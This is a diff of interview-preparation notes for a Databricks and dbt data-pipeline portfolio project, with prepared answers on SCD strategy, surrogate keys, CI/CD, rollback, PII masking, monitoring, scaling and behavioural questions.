+**Impact:** Pending: totals reconcile to source (order value in Gold equals the sum of payments) and grain tests (`unique` on the grain key) pass on every build.
+
+**How I'd do it differently:** "One Big Table, denormalised: faster for BI tools and simpler for casual users, but every attribute change means rewriting the wide table. Data Vault: better for many sources and full auditability, at the cost of more tables and a harder query layer."
+
+**Follow-ups:**
+- *"Why does grain matter?"* "Mixing grains double-counts. Join payments to order items and an order with 3 items and 1 payment counts that payment 3 times."
+- *"Merge or append for facts?"* "Transaction facts are logically append-only, but retries and late corrections mean I merge on the grain key, so a rerun can't duplicate. For big date-partitioned facts, `insert_overwrite` by partition can be faster. Pending: the measured comparison."
+
+### What's your SCD strategy?
+
+**Answer:** "`dim_customer` is SCD Type 2: a new row with `valid_from`, `valid_to` and `is_current` whenever a tracked attribute (ZIP, city, state) changes, detected by comparing a hash of those columns. Facts join to the version that was current at order time, so last year's 'orders by city' report doesn't change when a Customer moves. Product and seller attributes are Type 1, because nobody asks what a product's category was last year, and Type 1 is simpler."
+
+**Impact:** "The first version was Type 1, and it showed the cost. A Customer who moves from Campinas to Salvador overwrites their city, so every historical order moves to Salvador. Pending: Type 2 versions per Customer, and the share of orders whose city differs between 'at order time' and 'current'."
+
+**How I'd do it differently:** "Type 2 via a dbt snapshot is simple but rebuilds history from whatever it sees, so a late row can create a wrong version order. With an incremental `merge` keyed on `updated_at`, I control late-arriving changes explicitly. Type 4, a current table plus a history table, suits very high-churn attributes."
+
+**Follow-ups:** *"How do you handle a late-arriving dimension change?"* "Insert the version with its real `valid_from`, close the previous version at that point, and re-point affected facts. That's a key reason for deterministic surrogate keys."
+
+### How do you generate surrogate keys?
+
+**Answer:** "A tested dbt macro that hashes the natural key plus the source system, and for SCD2 dimensions `valid_from`. Hashes are deterministic: the same row gets the same key in dev, staging and prod, and after any rebuild, so facts never need re-pointing and environments can be compared row for row."
+
+**Impact:** "324 rows, 324 distinct keys, 0 nulls (E4)."
+
+**How I'd do it differently:** "Identity columns: smaller (8 bytes instead of 32 for an MD5 hex string) and faster to join, but they're assigned at insert time. They differ between environments and change on rebuild."
+
+**Follow-ups:** *"What about hash collisions?"* "MD5 has 128 bits. At 30 billion keys, the birthday-bound probability of any collision is about 1 in 10^18 (projected). That's negligible, but a `unique` test would catch one anyway."
+
+### How are environments separated?
+
+**Answer:** "Three Unity Catalog catalogs (`dev`, `staging`, `prod`) in one workspace, each with its own deploy service principal that can write only to its own catalog. Inside `dev`, every developer gets `dbt_<user>_*` schemas and every PR gets `ci_pr_<n>_*` schemas, dropped when the PR closes. The same bundle YAML and the same dbt profile produce all of it from the target name."
+
+**Impact:** "The staging principal was denied creating a schema in prod (E10), so a leaked staging secret can't touch prod data. Per-developer schemas mean two engineers' test runs can never overwrite each other's tables."
+
+**How I'd do it differently:** "In a company I'd use a workspace per environment, or at least per prod/non-prod, for network and compute isolation. Free Edition allows one workspace, so catalogs with grants are the isolation boundary. Alternatively, Delta shallow clones of prod for dev give realistic data at near-zero storage cost."
+
+**Follow-ups:** *"Why does the dev schema contain the username, not just `tom`?"* "Databricks' development mode refuses any prefix without the user's identity, which guarantees uniqueness. I had to work around it stripping the separator from schema names: a bundle variable restores the `_` in dev only."
+
+### Walk me through your CI/CD.
+
+**Answer:** "On every PR: 13 gates. Ruff and sqlfluff, mypy, pytest with local Spark and a coverage floor, mutation testing with an 85% floor, a dependency audit, a licence check, secrets scanning, Semgrep, CodeQL, workflow linting, `bundle validate`, and slim dbt CI into PR schemas. On merge: deploy the staging target as the staging service principal, run the job, then wait for my approval in a protected GitHub Environment. Prod then deploys the same commit and tags it `prod-<date>-<sha>`. A concurrency group stops two deploys overlapping."
+
+**Impact:** "Mutation score 87.4% (E9): when the tool deliberately broke the code, the tests caught 87.4% of the breakages. A planted fake key was blocked before merge. 0 known vulnerabilities in 132 packages. Pending: PR-to-prod lead time, and slim CI build time vs a full build."
+
+**How I'd do it differently:** "OIDC federation instead of client secrets: no long-lived secret at all, but Free Edition has no account console, so it's documented in an ADR. Trunk-based development with feature flags instead of an approval gate suits teams that deploy many times a day."
+
+**Follow-ups:**
+- *"How do you guarantee prod runs what staging tested?"* "Both jobs check out the triggering commit SHA, not `main`, and prod can't start unless staging passed."
+- *"What does slim CI do on the very first run, with no prod manifest?"* "It falls back to building everything. After that, each prod deploy publishes its manifest for the next PR."
+
+### How do you roll back?
+
+**Answer:** "Code and data separately. Code: a manual workflow redeploys a chosen `prod-<date>-<sha>` tag, behind the same approval. Data: before each prod dbt run, the job records every Gold table's Delta version in `ops`, and rollback runs `RESTORE TABLE ... TO VERSION AS OF` for each one. I rehearsed it with a break-and-recover drill and wrote a postmortem."
+
+**Impact:** Pending: time to restore from the drill, and rows affected.
+
+**How I'd do it differently:** "Blue-green Gold schemas: build into an inactive schema, then swap views. Rollback is then instant, at double the storage. Or write-audit-publish, so bad data never reaches consumers at all."
+
+### How do you secure the data?
+
+**Answer:** "Least privilege everywhere. Deploys run as service principals, never people. Each principal can write only to its own catalog. Consumers can read Gold only. PII columns (email, phone) have Unity Catalog column masks, so anyone outside the `pii_readers` group sees a masked value. All grants are code, reviewed in PRs. Secrets live only in GitHub Environments, and the prod secrets can only be read after approval."
+
+**Impact:** "Staging principal denied in prod (E10). Secrets expire after 90 days and rotate with zero downtime (E12). Pending: the masking proof as a non-`pii_readers` user."
+
+**How I'd do it differently:** "Tokenise PII at ingestion, so even Bronze never holds raw values: stronger, but analysts can't join on real email. Or use attribute-based access control with tags, which scales better than per-column masks with hundreds of PII columns."
+
+### How do you monitor it?
+
+**Answer:** "Every task writes structured JSON logs with run ID, entity, File Drop date and row counts, plus one audit row in an `ops` table: rows read, written and quarantined, duration and status. dbt's `run_results.json` is loaded after each run. SQL alerts fire on job failure, quarantine rate, freshness (more than 26 hours without a File Drop) and failed tests, and each alert has a runbook."
+
+**Impact:** Pending: alert count and time-to-detect in the drill.
+
+**How I'd do it differently:** "A data observability tool (Monte Carlo, Elementary) for automatic anomaly detection on volume and distribution. It's worth it once there are hundreds of tables."
+
+### How do you debug a slow query?
+
+**Answer:** "Measure, then read the plan. Query profile first: which operator took the time, and how many files and bytes were read against how many were pruned. Then `EXPLAIN FORMATTED` for the physical plan: a broadcast versus a sort-merge join, missing partition filters. Then the Spark UI for skew: if the slowest task in a stage is 10 times the median, one key holds most of the rows. Then fix the cause: add a pruning predicate, cluster on the join key, broadcast the small side, or salt the skewed key."
+
+**Impact:** Pending: the deliberately slow query's runtime before and after, and files pruned.
+
+### How would this scale to terabytes?
+
+**Answer:** "I'd start with sizing. Compressed Customer rows are about 37 bytes (E8), so 1 TB is roughly 25 to 30 billion rows, or about 2.7 GB a day if it builds up over a year (projected). That drives six changes:
+1. **Incremental everywhere:** a full Silver rebuild shuffles 1 TB a day. Merging a 3-day lookback shuffles about 8 GB, roughly 125 times less (projected).
+2. **File discovery:** directory listing slows down with millions of files. `cloudFiles.useNotifications` uses storage events instead, and `maxBytesPerTrigger` bounds each batch, so a 30-day backfill of about 80 GB runs in 8 batches of 10 GB.
+3. **Layout:** liquid clustering on the merge and join keys, like `customer_unique_id`, so a `MERGE` skips files that can't match. Daily partitions only once each day is over about 1 GB, which 2.7 GB days are.
+4. **Small files:** optimized writes, auto-compaction and scheduled `OPTIMIZE`.
+5. **Skew:** AQE skew-join handling, and salting hot keys.
+6. **Measure first:** rank models by dbt `execution_time`, and size the warehouse from evidence."
+
+**Impact:** "The core pattern is measured: incremental beat a full reload 2.9 to 5 times at 91 files (E6), with cost that tracks one day, not history."
+
+**Follow-ups:** *"Have you run it at that scale?"* "Not this project; it runs at about 200,000 rows on Free Edition. I measured the patterns that decide behaviour at scale and can show the arithmetic. I'd be upfront about that."
+
+### How did you keep cost down?
+
+**Answer:** "It costs $0 (E13). Design choices that would also matter on a paid platform: serverless, so no idle clusters; `availableNow` instead of an always-on stream, about 900 times less compute time per day (projected); incremental loads; slim CI, which builds only what changed; and small daily files to stay inside quotas."
+
+## Behavioural questions
+
+### "What's the hardest problem you've solved?"
+
+**Situation:** "I needed every rerun of the pipeline to be safe. If a job fails halfway, the on-call engineer should be able to just rerun it, without knowing which step failed."
+
+**Task:** "Prove idempotency end to end, not just in theory: rerunning any step on the same input must change nothing."
+
+**Action:** "I traced every place where a rerun could create new state:
+- **Ingestion:** Auto Loader's checkpoint guarantees each file is committed once, but only by path. I caught that my own change, timestamped file names, would give a regenerated day a new path and double Bronze. I made file names deterministic, from the business date.
+- **Dedupe:** I made the ordering a total order, adding ingest time and file name after `updated_at`, because Spark breaks ties non-deterministically.
+- **Gold:** keys are hashes of natural keys, so a rebuild gives every row the same key.
+- **Tests at each seam:** a local Spark test runs the stream twice on a real Delta table, and dbt unit tests feed tied versions."
+
+**Result:** "Four runs on the same file produced one Bronze write, 331 rows (E5). Gold stayed at 324 Customers with 324 unique keys. Incremental loading was 2.9 to 5 times faster than full reloads at 91 days, and it can't double-load."
+
+*Replace or add to this as later work produces a harder story: slim CI's first-run manifest, SCD2 with late-arriving changes, or the slow-query diagnosis.*
+
+### "Tell me about a time a tool didn't behave as documented."
+
+"Deploying with Databricks Asset Bundles, my dev schemas came out as `dbt_thomasjwrightmainbronze`, without the underscore, while the job name was correct. That broke the contract with dbt, which reads `dbt_thomasjwrightmain_bronze`. Rather than deploy and guess, I ran `bundle validate -o json` against throwaway copies of the config. It resolves every name without touching the workspace. Five experiments showed four rules: development mode always prefixes schemas, strips the prefix's trailing `_` for schemas but not jobs, falls back to `dev_<user>_` if the prefix is empty, and rejects any prefix without the username. One variable, `_` in dev and empty elsewhere, fixed it from identical YAML, and tests pin the naming for every target. The same week, the dbt task ignored my `profiles.yml`, because Databricks only reads it when no `warehouse_id` is set. I found that in the API reference, removed one line, and now one profile serves local, CI and the job."
 
 ### "What are you most proud of?"
 
-"That idempotency is proven at every layer, and that I caught a bug that would have silently broken it.
+Pending: the full PR-to-prod promotion with no UI edits. Until then: "The safety net. 13 CI gates, with mutation testing at 87.4%. Coverage only tells you a line ran; mutation testing tells you a test would notice if that line were wrong. When I first ran it, it exposed tests that executed code without checking it, and fixing them raised the score from 78.9% to 87.4%."
 
-To make File Drops look like real exports, I changed the file name to include a wall-clock timestamp, along the lines of `customers_20261126T061502.csv`. Then `test_rerunning_on_the_same_file_drop_adds_no_rows` made me think about what a rerun does. Auto Loader identifies files by path, so a rerun of the generator for 2017-01-01 would write a *new* path with the same 331 rows, and Bronze would go to 662 with nothing failing. I changed the name to derive from the drop's own date, `customers_2017-01-01.csv`. That's realistic, because many sources name exports by business date, and it makes generator output byte-for-byte reproducible.
+### "Tell me about a mistake."
 
-The proof is layered. Locally, `test_rerunning_on_the_same_file_drop_adds_no_rows` runs the real stream twice on a Delta table and asserts the count doesn't change, and `test_a_new_file_drop_adds_only_its_own_rows` asserts a second day adds exactly its rows. On Databricks, Delta history shows one write in four runs, and Bronze stayed at 331 and Gold at 324. The mutation score is 87.4%: mutmut injected bugs into the code, and the tests caught 87.4% of them."
+"I changed Silver to drop rows that failed validation, and the counts looked fine: 331 rows in, 324 Customers out. When I reconciled distinct Customers instead of rows, 326 went in and 324 came out. Two Customers' only rows were malformed, so they vanished from Gold entirely. Row counts hid it; key counts showed it. That's why bad rows now go to quarantine with a reason code, and why I reconcile on keys, not rows."
 
-### "Tell me about a data quality decision you'd change."
+### "What would you do differently?"
 
-"Silver currently *drops* invalid rows, and the numbers show why that's not good enough. The drop had 326 distinct Customers, but Gold has 324. The generator replaced 2 Customers' only row with a corrupted one (`zip_code_prefix = 'not-a-zip'`), so 2 Customers (0.6%) are missing from Gold with no trace except a count difference. The 5 duplicates were harmless: exact copies, collapsed to one row each.
+- **Contracts first:** I'd write the source data contracts before the first ingestion, not after, so drift handling is designed in, not retrofitted.
+- **Key-level reconciliation from day one:** compare distinct keys in and out of each layer, not just rows.
+- **Incremental Silver from the start:** building it full-refresh first made the slice quick, but the merge logic is the part that's hard to retrofit.
+- **On a paid platform:** OIDC instead of client secrets, separate workspaces for prod, and system tables for cost and lineage.
 
-Ticket 08 fixes that: `stg_customers` splits into valid rows and a `quarantine.customers` table with the failing rule per row, a quarantine-rate check fails the job above a threshold, and a `replay` parameter reprocesses a date range once the source corrects the data. The drop-rate here, 2 of 331 rows (0.6%), becomes a monitored metric instead of something I found by hand."
+## Questions to practise
 
-### "How would you improve this, and how would it scale to terabytes?"
-
-"I'd start with sizing, from measured numbers. Bronze stored 331 rows in 12,366 bytes of compressed Parquet, about 37 bytes a row, so 1 TB is roughly 25 to 30 billion Customer rows. If that builds up over a year, it's about 2.7 GB a day (projected). Five changes follow from that:
-
-1. **Silver becomes incremental.** Today `stg_customers` is a full rebuild, and its `row_number()` shuffles every Bronze row by `customer_unique_id`. At 1 TB that's a 1 TB shuffle every day. The fix (ticket 06):
-   ```sql
-   {{ config(materialized='incremental', incremental_strategy='merge', unique_key='customer_unique_id') }}
-   ...
-   {% if is_incremental() %}
-   where _ingested_at >= (select max(_ingested_at) - interval 3 days from {{ this }})
-   {% endif %}
-   ```
-   The daily shuffle drops to about 3 days times 2.7 GB, about 8 GB, roughly 125 times less than 1 TB (projected). The 3-day lookback catches late-arriving files. Liquid clustering Silver on `customer_unique_id` lets the `MERGE` skip files that can't contain a match.
-2. **File discovery.** Directory listing scans the landing folder every run, which becomes the bottleneck with millions of files. `cloudFiles.useNotifications = true` switches to cloud storage events, so discovery cost stops growing with history. `cloudFiles.maxBytesPerTrigger = 10g` bounds each micro-batch, so a 30-day backfill of about 80 GB runs in 8 batches instead of one that runs out of memory.
-3. **Partitioning.** At 331 rows a day, daily partitions are tiny files, which is why Databricks recommends liquid clustering below about 1 TB. At 2.7 GB a day, each partition is above the roughly 1 GB guideline, so `partitionBy(_file_drop_date)` becomes the right call. I'd verify with `EXPLAIN` and the `files pruned` metric in the query profile (ticket 16).
-4. **Small files.** Streaming writes create many small files, so I'd set `delta.autoOptimize.optimizeWrite = true` and `autoCompact = true`, and schedule `OPTIMIZE`. A scan that opens 100,000 small files is dominated by per-file overhead.
-5. **Measure first.** Today dbt is 57 of 91 to 101 seconds, about 60% of runtime, but on 331 rows that's almost all fixed overhead (warehouse connection, compilation, 11 test queries). At TB scale the queries dominate. I'd rank models by `execution_time` from dbt's `run_results.json`, and check the Spark UI for skew in the dedupe shuffle: one Customer with a million updates puts a million rows on one task, which AQE's skew handling or salting fixes."
-
-### "Have you worked at terabyte scale?"
-
-"Not on this project; it runs at about 200,000 rows on Databricks Free Edition. What I can show is the core pattern measured, not assumed: incremental ingestion was 2.9 to 5 times faster than a full reload at 91 files, with cost proportional to the day rather than history. I can do the sizing arithmetic for 1 TB, about 25 to 30 billion rows and 2.7 GB a day, and name the five changes it forces: incremental `MERGE` in Silver, notification-mode discovery, `maxBytesPerTrigger`, partitioning sized to the data, and compaction."
-
-### Quick follow-ups
-
-- **"What happens if the checkpoint is deleted?"** Auto Loader forgets what it loaded and reloads every file: Bronze would double to 662 rows. Silver's dedupe would still give 324 Customers, which is why the dedupe sits downstream of an append-only Bronze. The checkpoint lives in the landing volume, outside the watched `customers/` folder, so Auto Loader never reads its own files as data.
-- **"What if a source resends a corrected file under a new name?"** Both load, because Auto Loader tracks paths, not content. Silver's tie-breakers then pick the correction deterministically, by later `updated_at` or later `_ingested_at`.
-- **"Why not `cloudFiles.inferColumnTypes`?"** Inference would type `updated_at` as a date from the first files, and then a `not-a-date` value would land in `_rescued_data`, splitting one column's data across two places. Strings in Bronze keep every value in its own column.
-- **"What does Type 1 cost an analyst?"** If Customer `u1` moves from Campinas to Salvador, Type 1 overwrites the city, so last year's 'orders by city' report silently moves their orders to Salvador. SCD Type 2 (ticket 07) adds `valid_from` and `valid_to`, and facts join on the version that was current at order time.
-- **"Why does the dbt run take 58 s for 331 rows?"** Fixed cost: connecting to the serverless warehouse, compiling the project, and running 3 unit tests and 8 data tests as separate queries. That's why I measure per-model time before optimising anything.
+- Walk me through the architecture. Where would it break first at 10x volume?
+- Why dbt? Why not do everything in Spark? Where does dbt hurt?
+- What happens if a job fails halfway and someone reruns it?
+- How do you handle late-arriving data? Late-arriving dimension changes?
+- How do you know Gold is correct? How do you reconcile it to the source?
+- Merge vs append vs `insert_overwrite` for facts: which, and why?
+- Partitioning vs liquid clustering vs Z-order?
+- How do you handle a breaking schema change from a source?
+- What's in your CI? Why mutation testing?
+- How do you roll back bad data, not just bad code?
+- How do you secure PII? Who can see what?
+- A query got 10 times slower overnight. What do you do?
+- How much does it cost, and how would you reduce it?
+- What's the hardest problem you solved? What would you do differently?
